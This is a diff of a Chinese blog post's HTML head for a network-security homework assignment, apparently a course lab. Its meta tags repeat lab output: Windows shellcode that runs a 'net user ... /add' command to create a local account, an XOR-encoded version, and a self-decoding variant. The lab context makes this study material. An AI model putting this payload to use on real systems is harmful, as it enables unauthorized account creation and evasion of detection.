@@ -1,24 +1,20 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='得分10/10
-修改源代码 ![[IMG_2949.png]]
-shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 Z:\toStudentCh11-3&amp;gt;GetShellcode.'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="得分10/10\n修改源代码 ![[IMG_2949.png]]\nshellcode 1 2 3Z:\\toStudentCh11-3&gt;GetShellcode.exe 4/* 292=0x124 bytes */ 5&#34;\\x33\\xc0\\x50\\x68\\x2f\\x61\\x64\\x64\\x68\\x74\\x30\\x31\\x20\\x68\\x20\\x74&#34; 6&#34;\\x65\\x73\\x68\\x75\\x73\\x65\\x72\\x68\\x65\\x78\\x65\\x20\\x68\\x6e\\x65\\x74&#34; 7&#34;\\x2e\\x68\\x70\\x61\\x64\\x2e\\x68\\x6e\\x6f\\x74\\x65\\x8b\\xfc\\x68\\x57\\x66&#34; 8&#34;\\x0d\\xff\\x68\\x63\\x89\\xd1\\x4f\\x68\\xc9\\xbc\\xa6\\x6b\\x5a\\xe8\\x56\\x00&#34; 9&#34;\\x00\\x00\\x8b\\xf0\\x5a\\xe8\\x4e\\x00\\x00\\x00\\x8b\\xd8\\xe8\\x05\\x00\\x00&#34; 10&#34;\\x00\\xe9\\xce\\x00\\x00\\x00\\x51\\x52\\x56\\x57\\x55\\x8b\\xec\\x8b\\xd7\\x83&#34; 11&#34;\\xec\\x54\\x8b\\xfc\\x6a\\x14\\x59\\x33\\xc0\\x89\\x04\\x8f\\xe2\\xfb\\xc6\\x47&#34; 12&#34;\\x10\\x44\\x8d\\x47\\x10\\x57\\x50\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a&#34; 13&#34;\\x00\\x6a\\x00\\x52\\x6a\\x00\\xff\\xd6\\x83\\xf8\\x00\\x74\\x03\\x50\\xff\\xd3&#34; 14&#34;\\x8b\\xe5\\x5d\\x5f\\x5e\\x5a\\x59\\xc3\\x56\\x53\\x51\\x52\\xe8\\x11\\x00\\x00&#34; 15&#34;\\x00\\x83\\xf8\\x00\\x7e\\x07\\x8b\\xd8\\xe8\\x17\\x00\\x00\\x00\\x5a\\x59\\x5b&#34; 16&#34;\\x5e\\xc3\\x64\\xa1\\x30\\x00\\x00\\x00\\x8b\\x40\\x0c\\x8b\\x40\\x1c\\x8b\\x00&#34; 17&#34;\\x8b\\x40\\x08\\xc3\\x8b\\x43\\x3c\\x8b\\x44\\x18\\x78\\x03\\xc3\\x8b\\xf0\\x8b&#34; 18&#34;\\x4e\\x18\\x8b\\x46\\x20\\x03\\xc3\\x8b\\x44\\x88\\xfc\\x03\\xc3\\x57\\x8b\\xf8&#34; 19&#34;\\xe8\\x17\\x00\\x00\\x00\\x5f\\x3b\\xc2\\x74\\x06\\xe2\\xe6\\x33\\xc0\\xeb\\x0b&#34; 20&#34;\\x8b\\x46\\x1c\\x03\\xc3\\x8b\\x44\\x88\\xfc\\x03\\xc3\\xc3\\x53\\x51\\x52\\x57&#34; 21&#34;\\x33\\xd2\\x0f\\xbe\\x07\\x83\\xf8\\x00\\x74\\x13\\x8b\\xda\\x8b\\xca\\xc1\\xe3&#34; 22&#34;\\x19\\xc1\\xe9\\x07\\x0b\\xd9\\x8b\\xd3\\x03\\xd0\\x47\\xeb\\xe5\\x8b\\xc2\\x5f&#34; 23&#34;\\x5a\\x59\\x5b\\xc3&#34;; 24 XorByte=0xfe 25/* 292=0x124 bytes */ 26&#34;\\xcd\\x3e\\xae\\x96\\xd1\\x9f\\x9a\\x9a\\x96\\x8a\\xce\\xcf\\xde\\x96\\xde\\x8a&#34; 27&#34;\\x9b\\x8d\\x96\\x8b\\x8d\\x9b\\x8c\\x96\\x9b\\x86\\x9b\\xde\\x96\\x90\\x9b\\x8a&#34; 28&#34;\\xd0\\x96\\x8e\\x9f\\x9a\\xd0\\x96\\x90\\x91\\x8a\\x9b\\x75\\x02\\x96\\xa9\\x98&#34; 29&#34;\\xf3\\x01\\x96\\x9d\\x77\\x2f\\xb1\\x96\\x37\\x42\\x58\\x95\\xa4\\x16\\xa8\\xfe&#34; 30&#34;\\xfe\\xfe\\x75\\x0e\\xa4\\x16\\xb0\\xfe\\xfe\\xfe\\x75\\x26\\x16\\xfb\\xfe\\xfe&#34; 31&#34;\\xfe\\x17\\x30\\xfe\\xfe\\xfe\\xaf\\xac\\xa8\\xa9\\xab\\x75\\x12\\x75\\x29\\x7d&#34; 32&#34;\\x12\\xaa\\x75\\x02\\x94\\xea\\xa7\\xcd\\x3e\\x77\\xfa\\x71\\x1c\\x05\\x38\\xb9&#34; 33&#34;\\xee\\xba\\x73\\xb9\\xee\\xa9\\xae\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94&#34; 34&#34;\\xfe\\x94\\xfe\\xac\\x94\\xfe\\x01\\x28\\x7d\\x06\\xfe\\x8a\\xfd\\xae\\x01\\x2d&#34; 35&#34;\\x75\\x1b\\xa3\\xa1\\xa0\\xa4\\xa7\\x3d\\xa8\\xad\\xaf\\xac\\x16\\xef\\xfe\\xfe&#34; 36&#34;\\xfe\\x7d\\x06\\xfe\\x80\\xf9\\x75\\x26\\x16\\xe9\\xfe\\xfe\\xfe\\xa4\\xa7\\xa5&#34; 37&#34;\\xa0\\x3d\\x9a\\x5f\\xce\\xfe\\xfe\\xfe\\x75\\xbe\\xf2\\x75\\xbe\\xe2\\x75\\xfe&#34; 38&#34;\\x75\\xbe\\xf6\\x3d\\x75\\xbd\\xc2\\x75\\xba\\xe6\\x86\\xfd\\x3d\\x75\\x0e\\x75&#34; 39&#34;\\xb0\\xe6\\x75\\xb8\\xde\\xfd\\x3d\\x75\\xba\\x76\\x02\\xfd\\x3d\\xa9\\x75\\x06&#34; 40&#34;\\x16\\xe9\\xfe\\xfe\\xfe\\xa1\\xc5\\x3c\\x8a\\xf8\\x1c\\x18\\xcd\\x3e\\x15\\xf5&#34; 41&#34;\\x75\\xb8\\xe2\\xfd\\x3d\\x75\\xba\\x76\\x02\\xfd\\x3d\\x3d\\xad\\xaf\\xac\\xa9&#34; 42&#34;\\xcd\\x2c\\xf1\\x40\\xf9\\x7d\\x06\\xfe\\x8a\\xed\\x75\\x24\\x75\\x34\\x3f\\x1d&#34; 43&#34;\\xe7\\x3f\\x17\\xf9\\xf5\\x27\\x75\\x2d\\xfd\\x2e\\xb9\\x15\\x1b\\x75\\x3c\\xa1&#34; 44&#34;\\xa4\\xa7\\xa5\\x3d&#34;; 45 Success: encode is OK 46 47 48 49length of shellcode = 315 = 0x13b 50/* 315=0x13b bytes */ 51&#34;\\xeb\\x10\\x5b\\x53\\x4b\\x33\\xc9\\x66\\xb9\\x24\\x01\\x80\\x34\\x0b\\xfe\\xe2&#34; 52&#34;\\xfa\\xc3\\xe8\\xeb\\xff\\xff\\xff\\xcd\\x3e\\xae\\x96\\xd1\\x9f\\x9a\\x9a\\x96&#34; 53&#34;\\x8a\\xce\\xcf\\xde\\x96\\xde\\x8a\\x9b\\x8d\\x96\\x8b\\x8d\\x9b\\x8c\\x96\\x9b&#34; 54&#34;\\x86\\x9b\\xde\\x96\\x90\\x9b\\x8a\\xd0\\x96\\x8e\\x9f\\x9a\\xd0\\x96\\x90\\x91&#34; 55&#34;\\x8a\\x9b\\x75\\x02\\x96\\xa9\\x98\\xf3\\x01\\x96\\x9d\\x77\\x2f\\xb1\\x96\\x37&#34; 56&#34;\\x42\\x58\\x95\\xa4\\x16\\xa8\\xfe\\xfe\\xfe\\x75\\x0e\\xa4\\x16\\xb0\\xfe\\xfe&#34; 57&#34;\\xfe\\x75\\x26\\x16\\xfb\\xfe\\xfe\\xfe\\x17\\x30\\xfe\\xfe\\xfe\\xaf\\xac\\xa8&#34; 58&#34;\\xa9\\xab\\x75\\x12\\x75\\x29\\x7d\\x12\\xaa\\x75\\x02\\x94\\xea\\xa7\\xcd\\x3e&#34; 59&#34;\\x77\\xfa\\x71\\x1c\\x05\\x38\\xb9\\xee\\xba\\x73\\xb9\\xee\\xa9\\xae\\x94\\xfe&#34; 60&#34;\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\xac\\x94\\xfe\\x01\\x28\\x7d&#34; 61&#34;\\x06\\xfe\\x8a\\xfd\\xae\\x01\\x2d\\x75\\x1b\\xa3\\xa1\\xa0\\xa4\\xa7\\x3d\\xa8&#34; 62&#34;\\xad\\xaf\\xac\\x16\\xef\\xfe\\xfe\\xfe\\x7d\\x06\\xfe\\x80\\xf9\\x75\\x26\\x16&#34; 63&#34;\\xe9\\xfe\\xfe\\xfe\\xa4\\xa7\\xa5\\xa0\\x3d\\x9a\\x5f\\xce\\xfe\\xfe\\xfe\\x75&#34; 64&#34;\\xbe\\xf2\\x75\\xbe\\xe2\\x75\\xfe\\x75\\xbe\\xf6\\x3d\\x75\\xbd\\xc2\\x75\\xba&#34; 65&#34;\\xe6\\x86\\xfd\\x3d\\x75\\x0e\\x75\\xb0\\xe6\\x75\\xb8\\xde\\xfd\\x3d\\x75\\xba&#34; 66&#34;\\x76\\x02\\xfd\\x3d\\xa9\\x75\\x06\\x16\\xe9\\xfe\\xfe\\xfe\\xa1\\xc5\\x3c\\x8a&#34; 67&#34;\\xf8\\x1c\\x18\\xcd\\x3e\\x15\\xf5\\x75\\xb8\\xe2\\xfd\\x3d\\x75\\xba\\x76\\x02&#34; 68&#34;\\xfd\\x3d\\x3d\\xad\\xaf\\xac\\xa9\\xcd\\x2c\\xf1\\x40\\xf9\\x7d\\x06\\xfe\\x8a&#34; 69&#34;\\xed\\x75\\x24\\x75\\x34\\x3f\\x1d\\xe7\\x3f\\x17\\xf9\\xf5\\x27\\x75\\x2d\\xfd&#34; 70&#34;\\x2e\\xb9\\x15\\x1b\\x75\\x3c\\xa1\\xa4\\xa7\\xa5\\x3d&#34;; 71 72命令成功完成。 73 74 75 76Z:\\toStudentCh11-3&gt; 查看用户 ">
 <title>网络安全作业7</title>
 
 <link rel='canonical' href='https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A7/'>
 
-<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='网络安全作业7'>
-<meta property='og:description' content='得分10/10
-修改源代码 ![[IMG_2949.png]]
-shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 Z:\toStudentCh11-3&amp;gt;GetShellcode.'>
+<link rel="stylesheet" href="/scss/style.min.f422e1b5411823880f5c414ca9b2da02907d0b11d5abfbd5d77b8eb1433fbdd3.css"><meta property='og:title' content="网络安全作业7">
+<meta property='og:description' content="得分10/10\n修改源代码 ![[IMG_2949.png]]\nshellcode 1 2 3Z:\\toStudentCh11-3&gt;GetShellcode.exe 4/* 292=0x124 bytes */ 5&#34;\\x33\\xc0\\x50\\x68\\x2f\\x61\\x64\\x64\\x68\\x74\\x30\\x31\\x20\\x68\\x20\\x74&#34; 6&#34;\\x65\\x73\\x68\\x75\\x73\\x65\\x72\\x68\\x65\\x78\\x65\\x20\\x68\\x6e\\x65\\x74&#34; 7&#34;\\x2e\\x68\\x70\\x61\\x64\\x2e\\x68\\x6e\\x6f\\x74\\x65\\x8b\\xfc\\x68\\x57\\x66&#34; 8&#34;\\x0d\\xff\\x68\\x63\\x89\\xd1\\x4f\\x68\\xc9\\xbc\\xa6\\x6b\\x5a\\xe8\\x56\\x00&#34; 9&#34;\\x00\\x00\\x8b\\xf0\\x5a\\xe8\\x4e\\x00\\x00\\x00\\x8b\\xd8\\xe8\\x05\\x00\\x00&#34; 10&#34;\\x00\\xe9\\xce\\x00\\x00\\x00\\x51\\x52\\x56\\x57\\x55\\x8b\\xec\\x8b\\xd7\\x83&#34; 11&#34;\\xec\\x54\\x8b\\xfc\\x6a\\x14\\x59\\x33\\xc0\\x89\\x04\\x8f\\xe2\\xfb\\xc6\\x47&#34; 12&#34;\\x10\\x44\\x8d\\x47\\x10\\x57\\x50\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a&#34; 13&#34;\\x00\\x6a\\x00\\x52\\x6a\\x00\\xff\\xd6\\x83\\xf8\\x00\\x74\\x03\\x50\\xff\\xd3&#34; 14&#34;\\x8b\\xe5\\x5d\\x5f\\x5e\\x5a\\x59\\xc3\\x56\\x53\\x51\\x52\\xe8\\x11\\x00\\x00&#34; 15&#34;\\x00\\x83\\xf8\\x00\\x7e\\x07\\x8b\\xd8\\xe8\\x17\\x00\\x00\\x00\\x5a\\x59\\x5b&#34; 16&#34;\\x5e\\xc3\\x64\\xa1\\x30\\x00\\x00\\x00\\x8b\\x40\\x0c\\x8b\\x40\\x1c\\x8b\\x00&#34; 17&#34;\\x8b\\x40\\x08\\xc3\\x8b\\x43\\x3c\\x8b\\x44\\x18\\x78\\x03\\xc3\\x8b\\xf0\\x8b&#34; 18&#34;\\x4e\\x18\\x8b\\x46\\x20\\x03\\xc3\\x8b\\x44\\x88\\xfc\\x03\\xc3\\x57\\x8b\\xf8&#34; 19&#34;\\xe8\\x17\\x00\\x00\\x00\\x5f\\x3b\\xc2\\x74\\x06\\xe2\\xe6\\x33\\xc0\\xeb\\x0b&#34; 20&#34;\\x8b\\x46\\x1c\\x03\\xc3\\x8b\\x44\\x88\\xfc\\x03\\xc3\\xc3\\x53\\x51\\x52\\x57&#34; 21&#34;\\x33\\xd2\\x0f\\xbe\\x07\\x83\\xf8\\x00\\x74\\x13\\x8b\\xda\\x8b\\xca\\xc1\\xe3&#34; 22&#34;\\x19\\xc1\\xe9\\x07\\x0b\\xd9\\x8b\\xd3\\x03\\xd0\\x47\\xeb\\xe5\\x8b\\xc2\\x5f&#34; 23&#34;\\x5a\\x59\\x5b\\xc3&#34;; 24 XorByte=0xfe 25/* 292=0x124 bytes */ 26&#34;\\xcd\\x3e\\xae\\x96\\xd1\\x9f\\x9a\\x9a\\x96\\x8a\\xce\\xcf\\xde\\x96\\xde\\x8a&#34; 27&#34;\\x9b\\x8d\\x96\\x8b\\x8d\\x9b\\x8c\\x96\\x9b\\x86\\x9b\\xde\\x96\\x90\\x9b\\x8a&#34; 28&#34;\\xd0\\x96\\x8e\\x9f\\x9a\\xd0\\x96\\x90\\x91\\x8a\\x9b\\x75\\x02\\x96\\xa9\\x98&#34; 29&#34;\\xf3\\x01\\x96\\x9d\\x77\\x2f\\xb1\\x96\\x37\\x42\\x58\\x95\\xa4\\x16\\xa8\\xfe&#34; 30&#34;\\xfe\\xfe\\x75\\x0e\\xa4\\x16\\xb0\\xfe\\xfe\\xfe\\x75\\x26\\x16\\xfb\\xfe\\xfe&#34; 31&#34;\\xfe\\x17\\x30\\xfe\\xfe\\xfe\\xaf\\xac\\xa8\\xa9\\xab\\x75\\x12\\x75\\x29\\x7d&#34; 32&#34;\\x12\\xaa\\x75\\x02\\x94\\xea\\xa7\\xcd\\x3e\\x77\\xfa\\x71\\x1c\\x05\\x38\\xb9&#34; 33&#34;\\xee\\xba\\x73\\xb9\\xee\\xa9\\xae\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94&#34; 34&#34;\\xfe\\x94\\xfe\\xac\\x94\\xfe\\x01\\x28\\x7d\\x06\\xfe\\x8a\\xfd\\xae\\x01\\x2d&#34; 35&#34;\\x75\\x1b\\xa3\\xa1\\xa0\\xa4\\xa7\\x3d\\xa8\\xad\\xaf\\xac\\x16\\xef\\xfe\\xfe&#34; 36&#34;\\xfe\\x7d\\x06\\xfe\\x80\\xf9\\x75\\x26\\x16\\xe9\\xfe\\xfe\\xfe\\xa4\\xa7\\xa5&#34; 37&#34;\\xa0\\x3d\\x9a\\x5f\\xce\\xfe\\xfe\\xfe\\x75\\xbe\\xf2\\x75\\xbe\\xe2\\x75\\xfe&#34; 38&#34;\\x75\\xbe\\xf6\\x3d\\x75\\xbd\\xc2\\x75\\xba\\xe6\\x86\\xfd\\x3d\\x75\\x0e\\x75&#34; 39&#34;\\xb0\\xe6\\x75\\xb8\\xde\\xfd\\x3d\\x75\\xba\\x76\\x02\\xfd\\x3d\\xa9\\x75\\x06&#34; 40&#34;\\x16\\xe9\\xfe\\xfe\\xfe\\xa1\\xc5\\x3c\\x8a\\xf8\\x1c\\x18\\xcd\\x3e\\x15\\xf5&#34; 41&#34;\\x75\\xb8\\xe2\\xfd\\x3d\\x75\\xba\\x76\\x02\\xfd\\x3d\\x3d\\xad\\xaf\\xac\\xa9&#34; 42&#34;\\xcd\\x2c\\xf1\\x40\\xf9\\x7d\\x06\\xfe\\x8a\\xed\\x75\\x24\\x75\\x34\\x3f\\x1d&#34; 43&#34;\\xe7\\x3f\\x17\\xf9\\xf5\\x27\\x75\\x2d\\xfd\\x2e\\xb9\\x15\\x1b\\x75\\x3c\\xa1&#34; 44&#34;\\xa4\\xa7\\xa5\\x3d&#34;; 45 Success: encode is OK 46 47 48 49length of shellcode = 315 = 0x13b 50/* 315=0x13b bytes */ 51&#34;\\xeb\\x10\\x5b\\x53\\x4b\\x33\\xc9\\x66\\xb9\\x24\\x01\\x80\\x34\\x0b\\xfe\\xe2&#34; 52&#34;\\xfa\\xc3\\xe8\\xeb\\xff\\xff\\xff\\xcd\\x3e\\xae\\x96\\xd1\\x9f\\x9a\\x9a\\x96&#34; 53&#34;\\x8a\\xce\\xcf\\xde\\x96\\xde\\x8a\\x9b\\x8d\\x96\\x8b\\x8d\\x9b\\x8c\\x96\\x9b&#34; 54&#34;\\x86\\x9b\\xde\\x96\\x90\\x9b\\x8a\\xd0\\x96\\x8e\\x9f\\x9a\\xd0\\x96\\x90\\x91&#34; 55&#34;\\x8a\\x9b\\x75\\x02\\x96\\xa9\\x98\\xf3\\x01\\x96\\x9d\\x77\\x2f\\xb1\\x96\\x37&#34; 56&#34;\\x42\\x58\\x95\\xa4\\x16\\xa8\\xfe\\xfe\\xfe\\x75\\x0e\\xa4\\x16\\xb0\\xfe\\xfe&#34; 57&#34;\\xfe\\x75\\x26\\x16\\xfb\\xfe\\xfe\\xfe\\x17\\x30\\xfe\\xfe\\xfe\\xaf\\xac\\xa8&#34; 58&#34;\\xa9\\xab\\x75\\x12\\x75\\x29\\x7d\\x12\\xaa\\x75\\x02\\x94\\xea\\xa7\\xcd\\x3e&#34; 59&#34;\\x77\\xfa\\x71\\x1c\\x05\\x38\\xb9\\xee\\xba\\x73\\xb9\\xee\\xa9\\xae\\x94\\xfe&#34; 60&#34;\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\xac\\x94\\xfe\\x01\\x28\\x7d&#34; 61&#34;\\x06\\xfe\\x8a\\xfd\\xae\\x01\\x2d\\x75\\x1b\\xa3\\xa1\\xa0\\xa4\\xa7\\x3d\\xa8&#34; 62&#34;\\xad\\xaf\\xac\\x16\\xef\\xfe\\xfe\\xfe\\x7d\\x06\\xfe\\x80\\xf9\\x75\\x26\\x16&#34; 63&#34;\\xe9\\xfe\\xfe\\xfe\\xa4\\xa7\\xa5\\xa0\\x3d\\x9a\\x5f\\xce\\xfe\\xfe\\xfe\\x75&#34; 64&#34;\\xbe\\xf2\\x75\\xbe\\xe2\\x75\\xfe\\x75\\xbe\\xf6\\x3d\\x75\\xbd\\xc2\\x75\\xba&#34; 65&#34;\\xe6\\x86\\xfd\\x3d\\x75\\x0e\\x75\\xb0\\xe6\\x75\\xb8\\xde\\xfd\\x3d\\x75\\xba&#34; 66&#34;\\x76\\x02\\xfd\\x3d\\xa9\\x75\\x06\\x16\\xe9\\xfe\\xfe\\xfe\\xa1\\xc5\\x3c\\x8a&#34; 67&#34;\\xf8\\x1c\\x18\\xcd\\x3e\\x15\\xf5\\x75\\xb8\\xe2\\xfd\\x3d\\x75\\xba\\x76\\x02&#34; 68&#34;\\xfd\\x3d\\x3d\\xad\\xaf\\xac\\xa9\\xcd\\x2c\\xf1\\x40\\xf9\\x7d\\x06\\xfe\\x8a&#34; 69&#34;\\xed\\x75\\x24\\x75\\x34\\x3f\\x1d\\xe7\\x3f\\x17\\xf9\\xf5\\x27\\x75\\x2d\\xfd&#34; 70&#34;\\x2e\\xb9\\x15\\x1b\\x75\\x3c\\xa1\\xa4\\xa7\\xa5\\x3d&#34;; 71 72命令成功完成。 73 74 75 76Z:\\toStudentCh11-3&gt; 查看用户 ">
 <meta property='og:url' content='https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A7/'>
-<meta property='og:site_name' content='AGA&#39;s Blog'>
+<meta property='og:site_name' content=''>
 <meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='学习笔记' /><meta property='article:published_time' content='2023-12-23T11:28:18&#43;08:00'/><meta property='article:modified_time' content='2023-12-23T11:28:18&#43;08:00'/>
 <meta name="twitter:title" content="网络安全作业7">
-<meta name="twitter:description" content="得分10/10
-修改源代码 ![[IMG_2949.png]]
-shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 Z:\toStudentCh11-3&amp;gt;GetShellcode.">
+<meta name="twitter:description" content="得分10/10\n修改源代码 ![[IMG_2949.png]]\nshellcode 1 2 3Z:\\toStudentCh11-3&gt;GetShellcode.exe 4/* 292=0x124 bytes */ 5&#34;\\x33\\xc0\\x50\\x68\\x2f\\x61\\x64\\x64\\x68\\x74\\x30\\x31\\x20\\x68\\x20\\x74&#34; 6&#34;\\x65\\x73\\x68\\x75\\x73\\x65\\x72\\x68\\x65\\x78\\x65\\x20\\x68\\x6e\\x65\\x74&#34; 7&#34;\\x2e\\x68\\x70\\x61\\x64\\x2e\\x68\\x6e\\x6f\\x74\\x65\\x8b\\xfc\\x68\\x57\\x66&#34; 8&#34;\\x0d\\xff\\x68\\x63\\x89\\xd1\\x4f\\x68\\xc9\\xbc\\xa6\\x6b\\x5a\\xe8\\x56\\x00&#34; 9&#34;\\x00\\x00\\x8b\\xf0\\x5a\\xe8\\x4e\\x00\\x00\\x00\\x8b\\xd8\\xe8\\x05\\x00\\x00&#34; 10&#34;\\x00\\xe9\\xce\\x00\\x00\\x00\\x51\\x52\\x56\\x57\\x55\\x8b\\xec\\x8b\\xd7\\x83&#34; 11&#34;\\xec\\x54\\x8b\\xfc\\x6a\\x14\\x59\\x33\\xc0\\x89\\x04\\x8f\\xe2\\xfb\\xc6\\x47&#34; 12&#34;\\x10\\x44\\x8d\\x47\\x10\\x57\\x50\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a&#34; 13&#34;\\x00\\x6a\\x00\\x52\\x6a\\x00\\xff\\xd6\\x83\\xf8\\x00\\x74\\x03\\x50\\xff\\xd3&#34; 14&#34;\\x8b\\xe5\\x5d\\x5f\\x5e\\x5a\\x59\\xc3\\x56\\x53\\x51\\x52\\xe8\\x11\\x00\\x00&#34; 15&#34;\\x00\\x83\\xf8\\x00\\x7e\\x07\\x8b\\xd8\\xe8\\x17\\x00\\x00\\x00\\x5a\\x59\\x5b&#34; 16&#34;\\x5e\\xc3\\x64\\xa1\\x30\\x00\\x00\\x00\\x8b\\x40\\x0c\\x8b\\x40\\x1c\\x8b\\x00&#34; 17&#34;\\x8b\\x40\\x08\\xc3\\x8b\\x43\\x3c\\x8b\\x44\\x18\\x78\\x03\\xc3\\x8b\\xf0\\x8b&#34; 18&#34;\\x4e\\x18\\x8b\\x46\\x20\\x03\\xc3\\x8b\\x44\\x88\\xfc\\x03\\xc3\\x57\\x8b\\xf8&#34; 19&#34;\\xe8\\x17\\x00\\x00\\x00\\x5f\\x3b\\xc2\\x74\\x06\\xe2\\xe6\\x33\\xc0\\xeb\\x0b&#34; 20&#34;\\x8b\\x46\\x1c\\x03\\xc3\\x8b\\x44\\x88\\xfc\\x03\\xc3\\xc3\\x53\\x51\\x52\\x57&#34; 21&#34;\\x33\\xd2\\x0f\\xbe\\x07\\x83\\xf8\\x00\\x74\\x13\\x8b\\xda\\x8b\\xca\\xc1\\xe3&#34; 22&#34;\\x19\\xc1\\xe9\\x07\\x0b\\xd9\\x8b\\xd3\\x03\\xd0\\x47\\xeb\\xe5\\x8b\\xc2\\x5f&#34; 23&#34;\\x5a\\x59\\x5b\\xc3&#34;; 24 XorByte=0xfe 25/* 292=0x124 bytes */ 26&#34;\\xcd\\x3e\\xae\\x96\\xd1\\x9f\\x9a\\x9a\\x96\\x8a\\xce\\xcf\\xde\\x96\\xde\\x8a&#34; 27&#34;\\x9b\\x8d\\x96\\x8b\\x8d\\x9b\\x8c\\x96\\x9b\\x86\\x9b\\xde\\x96\\x90\\x9b\\x8a&#34; 28&#34;\\xd0\\x96\\x8e\\x9f\\x9a\\xd0\\x96\\x90\\x91\\x8a\\x9b\\x75\\x02\\x96\\xa9\\x98&#34; 29&#34;\\xf3\\x01\\x96\\x9d\\x77\\x2f\\xb1\\x96\\x37\\x42\\x58\\x95\\xa4\\x16\\xa8\\xfe&#34; 30&#34;\\xfe\\xfe\\x75\\x0e\\xa4\\x16\\xb0\\xfe\\xfe\\xfe\\x75\\x26\\x16\\xfb\\xfe\\xfe&#34; 31&#34;\\xfe\\x17\\x30\\xfe\\xfe\\xfe\\xaf\\xac\\xa8\\xa9\\xab\\x75\\x12\\x75\\x29\\x7d&#34; 32&#34;\\x12\\xaa\\x75\\x02\\x94\\xea\\xa7\\xcd\\x3e\\x77\\xfa\\x71\\x1c\\x05\\x38\\xb9&#34; 33&#34;\\xee\\xba\\x73\\xb9\\xee\\xa9\\xae\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94&#34; 34&#34;\\xfe\\x94\\xfe\\xac\\x94\\xfe\\x01\\x28\\x7d\\x06\\xfe\\x8a\\xfd\\xae\\x01\\x2d&#34; 35&#34;\\x75\\x1b\\xa3\\xa1\\xa0\\xa4\\xa7\\x3d\\xa8\\xad\\xaf\\xac\\x16\\xef\\xfe\\xfe&#34; 36&#34;\\xfe\\x7d\\x06\\xfe\\x80\\xf9\\x75\\x26\\x16\\xe9\\xfe\\xfe\\xfe\\xa4\\xa7\\xa5&#34; 37&#34;\\xa0\\x3d\\x9a\\x5f\\xce\\xfe\\xfe\\xfe\\x75\\xbe\\xf2\\x75\\xbe\\xe2\\x75\\xfe&#34; 38&#34;\\x75\\xbe\\xf6\\x3d\\x75\\xbd\\xc2\\x75\\xba\\xe6\\x86\\xfd\\x3d\\x75\\x0e\\x75&#34; 39&#34;\\xb0\\xe6\\x75\\xb8\\xde\\xfd\\x3d\\x75\\xba\\x76\\x02\\xfd\\x3d\\xa9\\x75\\x06&#34; 40&#34;\\x16\\xe9\\xfe\\xfe\\xfe\\xa1\\xc5\\x3c\\x8a\\xf8\\x1c\\x18\\xcd\\x3e\\x15\\xf5&#34; 41&#34;\\x75\\xb8\\xe2\\xfd\\x3d\\x75\\xba\\x76\\x02\\xfd\\x3d\\x3d\\xad\\xaf\\xac\\xa9&#34; 42&#34;\\xcd\\x2c\\xf1\\x40\\xf9\\x7d\\x06\\xfe\\x8a\\xed\\x75\\x24\\x75\\x34\\x3f\\x1d&#34; 43&#34;\\xe7\\x3f\\x17\\xf9\\xf5\\x27\\x75\\x2d\\xfd\\x2e\\xb9\\x15\\x1b\\x75\\x3c\\xa1&#34; 44&#34;\\xa4\\xa7\\xa5\\x3d&#34;; 45 Success: encode is OK 46 47 48 49length of shellcode = 315 = 0x13b 50/* 315=0x13b bytes */ 51&#34;\\xeb\\x10\\x5b\\x53\\x4b\\x33\\xc9\\x66\\xb9\\x24\\x01\\x80\\x34\\x0b\\xfe\\xe2&#34; 52&#34;\\xfa\\xc3\\xe8\\xeb\\xff\\xff\\xff\\xcd\\x3e\\xae\\x96\\xd1\\x9f\\x9a\\x9a\\x96&#34; 53&#34;\\x8a\\xce\\xcf\\xde\\x96\\xde\\x8a\\x9b\\x8d\\x96\\x8b\\x8d\\x9b\\x8c\\x96\\x9b&#34; 54&#34;\\x86\\x9b\\xde\\x96\\x90\\x9b\\x8a\\xd0\\x96\\x8e\\x9f\\x9a\\xd0\\x96\\x90\\x91&#34; 55&#34;\\x8a\\x9b\\x75\\x02\\x96\\xa9\\x98\\xf3\\x01\\x96\\x9d\\x77\\x2f\\xb1\\x96\\x37&#34; 56&#34;\\x42\\x58\\x95\\xa4\\x16\\xa8\\xfe\\xfe\\xfe\\x75\\x0e\\xa4\\x16\\xb0\\xfe\\xfe&#34; 57&#34;\\xfe\\x75\\x26\\x16\\xfb\\xfe\\xfe\\xfe\\x17\\x30\\xfe\\xfe\\xfe\\xaf\\xac\\xa8&#34; 58&#34;\\xa9\\xab\\x75\\x12\\x75\\x29\\x7d\\x12\\xaa\\x75\\x02\\x94\\xea\\xa7\\xcd\\x3e&#34; 